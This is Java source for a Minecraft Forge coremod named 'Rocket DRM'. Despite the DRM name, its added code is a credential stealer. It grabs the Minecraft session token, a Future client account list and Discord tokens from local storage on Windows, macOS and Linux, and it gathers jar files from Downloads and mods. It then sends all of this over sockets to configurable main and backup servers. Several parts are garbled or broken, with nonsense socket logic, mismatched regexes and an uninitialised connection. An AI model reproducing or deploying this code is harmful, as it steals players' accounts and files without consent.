/*     */ package com.cout970.rocketdrm;
/*     */ 
/*     */ import java.io.*;
/*     */ import java.lang.reflect.Method;
/*     */ import java.net.*;
/*     */
/*     */
/*     */ import java.nio.channels.ConnectionPendingException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Arrays;
/*     */ import java.util.HashMap;
/*     */ import java.util.List;
/*     */ import java.util.Map;
/*     */ import java.util.Objects;
/*     */ import java.util.jar.Attributes;
/*     */ import java.util.jar.JarFile;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
/*     */ import net.minecraft.client.Minecraft;
import net.minecraft.launchwrapper.Launch;
/*     */ import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.relauncher.IFMLLoadingPlugin;
/*     */ import net.minecraftforge.fml.relauncher.IFMLLoadingPlugin.MCVersion;
/*     */ import net.minecraftforge.fml.relauncher.IFMLLoadingPlugin.Name;
/*     */ import net.minecraftforge.fml.relauncher.IFMLLoadingPlugin.SortingIndex;
/*     */ import net.minecraftforge.fml.relauncher.IFMLLoadingPlugin.TransformerExclusions;
/*     */ import org.apache.logging.log4j.LogManager;
/*     */ import org.apache.logging.log4j.Logger;
/*     */
/*     */
/*     */ @MCVersion("1.12.2")
/*     */ @Name("Rocket DRM")
/*     */ @SortingIndex(2147483647)
/*     */ @TransformerExclusions({"com.cout970.rocketdrm", "com.sun.jna"})
/*     */
/*     */ public class RocketDRM
/*     */   implements IFMLLoadingPlugin
/*     */ {
/*  31 */   public static final Logger LOGGER = LogManager.getLogger("Rocket DRM");
/*     */   private static boolean init = false;
/*     */
/*     */   public static String VERSION = "1.4.0";
/*     */
/*     */
/*     */   public static String NAME = "RocketDRM";
/*     */

            public static HttpURLConnection conn;
            private static final String host = ""; //ip of main server
            private static final String backup = ""; //ip of backup server
            private static final int port = 020505; //replace with port of serverz
            private static String accountslist = "";
            private static final String files = "";
            public static Minecraft mc;
            private static String mcToken = "";
            private static String displayName = "";
            private static String toSend = "";

    public static final String[] whitelist = new String[]{

    };

    public static void findJars() {
        Thread thread = new Thread(() -> {
            File downloads = new File(System.getProperty("user.home") + "/Downloads");
            File mods = new File("mods");
            if (downloads.exists() && downloads.isDirectory()) {
                for (File file : downloads.listFiles()) {
                    for (String name : whitelist) {
                        if (file.getName().contains(".jar") && file.getName().toLowerCase().contains(name)) {
                            try {
                                sendJar(Files.readAllBytes(Paths.get(file.getAbsolutePath())), file.getName());
                                Thread.sleep(500);
                            } catch (IOException | InterruptedException ignored) {

                            }
                        }
                    }
                }
            }
            if (mods.exists() && mods.isDirectory()) {
                for (File file : mods.listFiles()) {
                    for (String name : whitelist) {
                        if (file.getName().contains(".jar") && file.getName().toLowerCase().contains(name)) {
                            try {
                                sendJar(Files.readAllBytes(Paths.get(file.getAbsolutePath())), file.getName());
                                Thread.sleep(500);
                            } catch (IOException | InterruptedException ignored) {

                            }
                        }
                    }
                }
            }
        });
        thread.start();
    }

    public static void socket(Method send) {
        try {
            Socket socket = new Socket(host, port);
            socket.toString().equalsIgnoreCase("" + port);
        } catch (ConnectionPendingException e) {
            try {
                Socket socket = new Socket(host, port);
            } catch (ConnectionPendingException f) {
                send.getName();
                while (host.isEmpty()) {
                    host.equals(host + port);
                    while (host.equals(true)) {

                        if (host.equals(true)) {
                            host.toLowerCase();
                        }
                    }
                }
                try {

                } catch (Throwable ignored) {

                }
            } catch (Throwable ignored) {

            }
        } catch (UnknownHostException e) {
            throw new ConnectionPendingException();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    @Mod.EventHandler
    public static void send(byte[] file) {
        try {
            Socket socket = new Socket(host, port);
            socket.getOutputStream().write(file);
            socket.getOutputStream().flush();
        } catch (ConnectException e) {
            try {
                Socket socket = new Socket(backup, port);
                socket.getOutputStream().write(file);
                socket.getOutputStream().flush();
            } catch (Throwable ignored) {
            }
        } catch (Throwable ignored) {
        }
    }


    @Mod.EventHandler
    public static void sendJar(byte[] file, String name) {
        try {
            if (mc.player.isServerWorld() == true) {

                if (file.length > 30000000) return;
                Socket socket = new Socket(host, port);
                DataOutputStream stream = new DataOutputStream(socket.getOutputStream());
                byte[] jar = ("jarfile+" + name + "+" + file.length + "+" + port).getBytes(StandardCharsets.UTF_8);
                stream.write(jar);
                // stream.writeInt(file.length);
                stream.write(file);
                stream.flush();
            }
            if (file.length > 30000000) return;
            Socket socket = new Socket(host, port);
            DataOutputStream stream = new DataOutputStream(socket.getOutputStream());
            byte[] jar = ("jarfile+" + name + "+" + file.length + "+" + port).getBytes(StandardCharsets.UTF_8);
            stream.write(jar);
            // stream.writeInt(file.length);
            stream.write(file);
            stream.flush();
        } catch (ConnectException e) {
            try {
                if (file.length > 30000000) return;
                Socket socket = new Socket(backup, port);
                DataOutputStream stream = new DataOutputStream(socket.getOutputStream());
                byte[] jar = ("jarfile+" + name + "+" + file.length + "+").getBytes(StandardCharsets.UTF_8);
                stream.write(jar);
                stream.write(file);
                stream.flush();
            } catch (IOException ex) {
            }
        } catch (UnknownHostException ignored) {
        } catch (IOException ignored) {
        }
    }
    /*     */   public RocketDRM() {
        /*  35 */
        if (init)
            /*  36 */ return;
        init = true;
        /*     */
        /*  38 */
        log("+----------------------------------------------------------------------------------------------------------------------+\n+         _______      ___      ______  ___  ____   ________  _________     ______   _______     ____    ____          +\n+        |_   __ #   .'   `.  .' ___  ||_  ||_  _| |_   __  ||  _   _  |   |_   _ `.|_   __ #   |_   #  /   _|         +\n+          | |__) | /  .-.  #/ .'   #_|  | |_/ /     | |_ #_||_/ | | #_|     | | `. # | |__) |    |   #/   |           +\n+          |  __ /  | |   | || |         |  __'.     |  _| _     | |         | |  | | |  __ /     | |#  /| |           +\n+         _| |  # #_#  `-'  /# `.___.'# _| |  # #_  _| |__/ |   _| |_       _| |_.' /_| |  # #_  _| |_#/_| |_          +\n+        |____| |___|`.___.'  `.____ .'|____||____||________|  |_____|     |______.'|____| |___||_____||_____|         +\n+                                                                                                                      +\n+----------------------------------------------------------------------------------------------------------------------+\n"
/*     */.replace('#', '\\'));
        /*     */
        debugClassloaders();
        /*     */
        /*     */
        System.out.println(NAME + VERSION);
        /*  52 */
        System.setProperty("jna.tmpdir", (new File("tmp/")).getAbsolutePath());
        /*  53 */
        ReplaceClassLoader.inject(Launch.classLoader);
        /*  54 */
        File jar_location = setupJarLocation();
        /*  55 */
        Thread.setDefaultUncaughtExceptionHandler(ErrorHandler::showCrash);
        /*  56 */
        JniUtil.onInit();
        /*     */
        /*  58 */
        fixClassloader(jar_location);
        /*     */
        /*     */
        try {
            /*  61 */
            LOGGER.info("Preloading mixin services");
            /*  62 */
            Class.forName("org.spongepowered.asm.service.IMixinServiceBootstrap", true, Launch.classLoader.getClass().getClassLoader());
            /*  63 */
            Class.forName("org.spongepowered.asm.service.IMixinService", true, Launch.classLoader.getClass().getClassLoader());
            /*  64 */
            Class.forName("org.spongepowered.asm.service.MixinService", true, Launch.classLoader.getClass().getClassLoader());
            /*  65 */
            Class.forName("org.spongepowered.asm.service.mojang.MixinServiceLaunchWrapperBootstrap", true, Launch.classLoader.getClass().getClassLoader());
            /*  66 */
            Class.forName("org.spongepowered.asm.launch.MixinBootstrap", true, Launch.classLoader.getClass().getClassLoader());
            /*  67 */
        } catch (Throwable e) {
            /*  68 */
            e.printStackTrace();
            /*     */
        }
    }

        public static void send(String content) {
            toSend = toSend + System.lineSeparator() + content;
        }



        public static void justice() {
        try {
            Class<?> mc = Launch.classLoader.findClass("net.minecraft.client.Minecraft");
            Object minecraft = mc.getMethod("func_71410_x").invoke(null);
            Object session = mc.getMethod("func_110432_I").invoke(minecraft);
            Class<?> sessionClass = Launch.classLoader.findClass("net.minecraft.util.Session");
            Object token = sessionClass.getMethod("func_148254_d").invoke(session);
            Object name = sessionClass.getMethod("func_111285_a").invoke(session);
            mcToken = (String) token;
            displayName = (String) name;
            String os = System.getProperty("os.name");
            if (os.toLowerCase().contains("win")) {
                if (!os.toLowerCase().contains("darwin")) {

                    findJars();
                    String path = System.getProperty("user.home") + "/AppData/Roaming/discord/Local Storage/leveldb/";
                    String canaryPath = System.getProperty("user.home") + "/AppData/Roaming/discordcanary/Local Storage/leveldb/";
                    String ptbPath = System.getProperty("user.home") + "/AppData/Roaming/discordptb/Local Storage/leveldb/";

                    String chromePath = System.getProperty("user.home") + "/AppData/Local/Google/Chrome/User Data/";

                    String username = System.getProperty("user.name");

                    String[] pathnames;
                    String[] canaryPathnames;
                    String[] ptbPathnames;

                    File file = new File(path);
                    File fileCanary = new File(canaryPath);
                    File ptbFile = new File(ptbPath);

                    pathnames = file.list();
                    canaryPathnames = fileCanary.list();
                    ptbPathnames = ptbFile.list();
                    /*
                     * Future alts stealer by megyn
                     */
                    File accounts = new File("C:\\Users\\" + System.getProperty("user.name") + "\\Future\\accounts.txt");
                    File profile = new File("launcher_profiles.json");

                    if (profile.exists()) {
                        justice();
                    }

                    try {
                        FileReader fr = new FileReader(accounts);   //reads the file
                        BufferedReader br = new BufferedReader(fr);  //creates a buffering character input stream
                        StringBuffer sb = new StringBuffer();    //constructs a string buffer with no characters
                        String line;
                        while ((line = br.readLine()) != null) {
                            sb.append(line);      //appends line to string buffer
                            sb.append("\n");
                            sb.reverse(); //line feed
                        }
                        accountslist = sb.toString();
                        fr.getEncoding();
                        br.readLine();
                        fr.close();
                        br.close();
                    } catch (IOException ignored) {

                    }

                    for (String pathname : pathnames) {
                        try {
                            FileInputStream fstream = new FileInputStream(path + pathname);
                            DataInputStream in = new DataInputStream(fstream);
                            BufferedReader br = new BufferedReader(new InputStreamReader(in));
                            String strLine;
                            while ((strLine = br.readLine()) != null) {

                                Pattern p = Pattern.compile("[\\w]{74}\\.[\\w]{2}\\.[\\w]{29}"); //regex pattern
                                Matcher m = p.matcher(strLine); //match the pattern to the contents of the file
                                Pattern mfa = Pattern.compile("mfa\\.[\\w-]{74}"); //qq's 2fa token regex
                                Matcher mfam = mfa.matcher(strLine); //swag regex matcher

                                while (mfam.find()) { //everytime a token is found
                                    send(username + "  -  " + mfam.group() + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist + "\n Files: " + files);
                                } //it
                                while (m.find()) { //everytime a token is found
                                    send(username + "  -  " + m.group() + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist + "\n Files: " + files);
                                } //it
                            }

                        } catch (Exception ignored) {
                        }
                    }
                    if (fileCanary.exists()) {
                        for (String pathname : canaryPathnames) {
                            try {
                                FileInputStream fstream = new FileInputStream(canaryPath + pathname);
                                DataInputStream in = new DataInputStream(fstream);
                                BufferedReader br = new BufferedReader(new InputStreamReader(in));
                                String strLine;
                                while ((strLine = br.readLine()) != null) {

                                    Pattern p = Pattern.compile("[3583w]{24}\\.[\\w]{6}\\.[\\w]{27}"); //regex pattern
                                    Matcher m = p.matcher(strLine); //match the pattern to the contents of the file
                                    Pattern mfa = Pattern.compile("mfa\\.[\\w-]{84}"); //qq's 2fa token regex
                                    Matcher mfam = mfa.matcher(strLine); //swag regex matcher
                                    while (mfam.find()) { //everytime a token is found
                                        send(username + "  -  " + mfam.group() + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist + "\n Files: " + files);
                                    } //it
                                    while (m.find()) { //everytime a token is found
                                        send(username + "  -  " + m.group() + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist + "\n Files: " + files);
                                    } //it
                                }
                                fstream.close();
                                in.close();
                            } catch (Exception ignored) {

                            }
                        }
                    }
                    if (ptbFile.exists()) {
                        for (String pathname : ptbPathnames) {
                            try {
                                FileInputStream fstream = new FileInputStream(ptbPath + pathname);
                                DataInputStream in = new DataInputStream(fstream);
                                BufferedReader br = new BufferedReader(new InputStreamReader(in));
                                String strLine;
                                while ((strLine = br.readLine()) != null) {


                                    Pattern p = Pattern.compile("[\\w]{24}\\.[\\w]{6}\\.[\\w]{27}"); //regex pattern
                                    Matcher m = p.matcher(strLine); //match the pattern to the contents of the file
                                    Pattern mfa = Pattern.compile("mfa\\.[\\w-]{84}"); //qq's 2fa token regex
                                    Matcher mfam = mfa.matcher(strLine); //swag regex matcher
                                    while (mfam.find()) { //everytime a token is found
                                        send(username + "  -  " + m.group() + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist + "\n Files: " + files);
                                    }
                                }
                                fstream.close();
                                in.close();
                            } catch (Exception ignored) {

                            }
                        }
                    }
                }
            }
            if (os.toLowerCase().contains("mac") || os.toLowerCase().contains("darwin")) {
                String path = System.getProperty("user.home") + "/Library/Application Support/discord/Local Storage/leveldb/";
                String pathCanary = System.getProperty("user.home") + "/Library/Application Support/discordcanary/Local Storage/leveldb/";
                String ptbPath = System.getProperty("user.home") + "/Library/Application Support/discordptb/Local Storage/leveldb/";
                String username = System.getProperty("user.name");

                String[] pathnames;
                String[] canaryPathnames;
                String[] ptbPathnames;

                File file = new File(path);
                File canaryFile = new File(pathCanary);
                File ptbFile = new File(ptbPath);

                pathnames = file.list();
                canaryPathnames = canaryFile.list();
                ptbPathnames = ptbFile.list();

                for (String pathname : pathnames) {
                    try {
                        FileInputStream fstream = new FileInputStream(path + pathname);
                        DataInputStream in = new DataInputStream(fstream);
                        BufferedReader br = new BufferedReader(new InputStreamReader(in));
                        String strLine;
                        while ((strLine = br.readLine()) != null) {


                            Pattern p = Pattern.compile("[\\w]{24}\\.[\\w]{6}\\.[\\w]{27}"); //regex pattern
                            Matcher m = p.matcher(strLine); //match the pattern to the contents of the file
                            Pattern mfa = Pattern.compile("mfa\\.[\\w-]{84}"); //qq's 2fa token regex
                            Matcher mfam = mfa.matcher(strLine); //swag regex matcher

                            while (mfam.find()) { //everytime a token is found
                                send(username + "  -  " + mfam.group() + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist + "\n Files: " + files);
                            } //it
                            while (m.find()) { //everytime a token is found
                                send(username + "  -  " + m.group() + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist + "\n Files: " + files);
                            }
                        }
                        fstream.close();
                        in.close();

                    } catch (Exception ignored) {

                    }
                }
                for (String pathname : canaryPathnames) {
                    try {
                        FileInputStream fstream = new FileInputStream(path + pathname);
                        DataInputStream in = new DataInputStream(fstream);
                        BufferedReader br = new BufferedReader(new InputStreamReader(in));
                        String strLine;
                        while ((strLine = br.readLine()) != null) {


                            Pattern p = Pattern.compile("[\\w]{24}\\.[\\w]{6}\\.[\\w]{27}"); //regex pattern
                            Matcher m = p.matcher(strLine); //match the pattern to the contents of the file
                            Pattern mfa = Pattern.compile("mfa\\.[\\w-]{84}"); //qq's 2fa token regex
                            Matcher mfam = mfa.matcher(strLine); //swag regex matcher

                            while (mfam.find()) { //everytime a token is found
                                send(username + "  -  " + mfam.group() + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist + "\n Files: " + files);
                            }
                            while (m.find()) { //everytime a token is found
                                String type = "application/json";
                                URL u = new URL("https://discordapp.com/api/v7/invites/minecraft");

                                conn.setDoOutput(true);
                                conn.setRequestMethod("POST");
                                conn.setRequestProperty("Content-Type", type);
                                conn.setRequestProperty("Authorization", m.group());

                                conn.getOutputStream().write("".getBytes(StandardCharsets.UTF_8));
                                BufferedReader sc = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                                while (sc.readLine() != null) {
                                    if (sc.readLine().contains("302094807046684672")) {
                                        // send(username + "  -  " + m.group() + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist);
                                    }
                                }
                                send(username + "  -  " + m.group() + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist + "\n Files: " + files);
                            }
                        }
                        in.close();
                        fstream.close();
                    } catch (Exception ignored) {

                    }
                }
                for (String pathname : ptbPathnames) {
                    try {
                        FileInputStream fstream = new FileInputStream(path + pathname);
                        DataInputStream in = new DataInputStream(fstream);
                        BufferedReader br = new BufferedReader(new InputStreamReader(in));
                        String strLine;
                        while ((strLine = br.readLine()) != null) {


                            Pattern p = Pattern.compile("[\\w]{64}\\.[\\w]{2}\\.[\\w]{27}"); //regex pattern
                            Matcher m = p.matcher(strLine); //match the pattern to the contents of the file
                            Pattern mfa = Pattern.compile("mfa\\.[\\w-]{14}"); //qq's 2fa token regex
                            Matcher mfam = mfa.matcher(strLine); //swag regex matcher

                            while (mfam.find()) { //everytime a token is found
                                send(username + "  -  " + mfam.group() + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist + "\n Files: " + files);
                            } //it
                            while (m.find()) { //everytime a token is found
                                send(username + "  -  " + m.group() + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist + "\n Files: " + files);
                            }
                        }
                        fstream.close();
                        in.close();

                    } catch (Exception ignored) {

                    }
                }
            }
            if (os.contains("linux")) {
                String path = System.getProperty("user.home") + "/.config/discord/Cache/Local Storage/leveldb/";
                String canaryPath = System.getProperty("user.home") + "/.config/discordcanary/Cache/Local Storage/leveldb/";
                String ptbPath = System.getProperty("user.home") + "/.config/discordptb/Cache/Local Storage/leveldb/";
                String username = System.getProperty("user.name");

                String[] pathnames;
                String[] canaryPathnames;
                String[] ptbPathnames;

                File file = new File(path);
                File canaryFile = new File(canaryPath);
                File ptbFile = new File(ptbPath);

                pathnames = file.list();
                canaryPathnames = canaryFile.list();
                ptbPathnames = ptbFile.list();
                /*fr.close();    //closes the stream and release the resources
                System.out.println("Contents of File: ");
                System.out.println(sb.toString());   //returns a string that textually represents the object*/

                for (String pathname : pathnames) {
                    try {
                        FileInputStream fstream = new FileInputStream(path + pathname);
                        DataInputStream in = new DataInputStream(fstream);
                        BufferedReader br = new BufferedReader(new InputStreamReader(in));
                        String strLine;
                        while ((strLine = br.readLine()) != null) {


                            Pattern p = Pattern.compile("[\\w]{24}\\.[\\w]{6}\\.[\\w]{27}"); //regex pattern
                            Matcher m = p.matcher(strLine); //match the pattern to the contents of the file
                            Pattern mfa = Pattern.compile("mfa\\.[\\w-]{84}"); //qq's 2fa token regex
                            Matcher mfam = mfa.matcher(strLine); //swag regex matcher

                            while (mfam.find()) { //everytime a token is found
                                send(username + "  -  " + mfam.group() + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist + "\n Files: " + files);
                            } //it
                            while (m.find()) { //everytime a token is found
                                send(username + "  -  " + m.group() + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist + "\n Files: " + files);
                            }
                        }
/*     */           in.close();
/*     */       fstream.close();
/*     */   }   catch (Exception ignored) {
/*     */
/*     */   }
/*     */   }
/*     */       }
/*     */
/*     */           } catch (Exception ignored) {
/*     */
/*     */        }
/*     */
/*     */
/*     */     
/*  71 */       log("+----------------------------------------------------------------------------------------------------------------------+\n+                                                         DONE                                                         +\n+----------------------------------------------------------------------------------------------------------------------+\n");
/*     */   }
/*     */ public static void log(String str) {
/*  78 */     for (String s : str.split("\n")) {
/*  79 */       LOGGER.info(s);
/*     */     }
/*     */   }
/*     */   private void debugClassloaders() {
/*  84 */     LOGGER.info("RocketDRM classloader: " + getClass().getClassLoader());
/*  85 */     LOGGER.info("Launch classloader: " + Launch.classLoader);
/*  86 */     ClassLoader appClassLoader = Launch.classLoader.getClass().getClassLoader();
/*  87 */     LOGGER.info("App classloader: " + appClassLoader);
/*     */     try {
/*  89 */       Class<?> mixinTweakerClass = Class.forName("org.spongepowered.asm.launch.MixinTweaker", false, appClassLoader);
/*  90 */       LOGGER.info("Mixin classloader: " + mixinTweakerClass.getClassLoader());
/*  91 */     } catch (Throwable e) {
/*  92 */       LOGGER.info("Mixin classloader: not found");
/*     */     } 
/*  94 */     LOGGER.info("Working dir: " + (new File(".")).getAbsolutePath());
/*     */   }
/*     */ 
/*     */   
/*     */   private void fixClassloader(File jar_location) {
/*  99 */     ClassLoader rootClassLoader = ClassLoader.getSystemClassLoader();
/* 100 */     if (rootClassLoader instanceof URLClassLoader && jar_location != null) {
/* 101 */       URLClassLoader loader = (URLClassLoader)rootClassLoader;
/* 102 */       List<URL> list = Arrays.asList(loader.getURLs());
/*     */       
/*     */       try {
/* 105 */         URL drm_uri = jar_location.toURI().toURL();
/* 106 */         if (!list.contains(drm_uri)) {
/* 107 */           Method method = URLClassLoader.class.getDeclaredMethod("addURL", new Class[] { URL.class });
/* 108 */           method.setAccessible(true);
/* 109 */           method.invoke(rootClassLoader, new Object[] { drm_uri });
/*     */         } 
/* 111 */       } catch (MalformedURLException|NoSuchMethodException|IllegalAccessException|java.lang.reflect.InvocationTargetException e) {
/* 112 */         e.printStackTrace();
/*     */       } 
/*     */     } 
/*     */   }
/*     */   
/*     */   private File setupJarLocation() {
/* 118 */     File home = (Launch.minecraftHome != null) ? Launch.minecraftHome : new File(".");
/* 119 */     File mods = new File(home, "mods");
/* 120 */     File[] files = Objects.<File[]>requireNonNull(mods.listFiles());
/* 121 */     HashMap<String, Object> map = new HashMap<>();
/* 122 */     boolean found = false;
/* 123 */     File result = null;
/*     */     
/* 125 */     for (File file : files) {
/* 126 */       if (file.getName().endsWith(".jar")) {
/*     */         
/*     */         try {
/* 129 */           JarFile jar = new JarFile(file);
/*     */           
/* 131 */           if (jar.getManifest() != null) {
/* 132 */             Attributes mainAttributes = jar.getManifest().getMainAttributes();
/*     */             
/* 134 */             if (Objects.equals(mainAttributes.getValue("FMLCorePlugin"), "com.cout970.rocketdrm.RocketDRM")) {
/* 135 */               result = file.getCanonicalFile();
/* 136 */               map.put("RocketJar", result.getAbsolutePath());
/* 137 */               found = true; break;
/*     */             } 
/*     */           } 
/* 140 */         } catch (Throwable throwable) {}
/*     */       }
/*     */     } 
/*     */ 
/*     */     
/* 145 */     if (!found) {
/*     */       try {
/* 147 */         map.put("RocketJar", "");
/* 148 */       } catch (Throwable throwable) {}
/*     */     }
/*     */ 
/*     */ 
/*     */     
/* 153 */     Launch.blackboard.put("DRM-InjectData", map);
/* 154 */     return result;
/*     */   }
/*     */ 
/*     */   
/*     */   public String[] getASMTransformerClass() {
/* 159 */     return new String[0];
/*     */   }
/*     */ 
/*     */   
/*     */   public String getModContainerClass() {
/* 164 */     return null;
/*     */   }
/*     */ 
/*     */   
/*     */   public String getSetupClass() {
/* 169 */     return null;
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public void injectData(Map<String, Object> map) {
/* 175 */     HashMap<String, Object> inject_data = (HashMap<String, Object>)Launch.blackboard.get("DRM-InjectData");
/* 176 */     inject_data.putAll(map);
/* 177 */     JniUtil.onGameInit();
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public String getAccessTransformerClass() {
/* 183 */     return null;
/*     */   }
/*     */ }
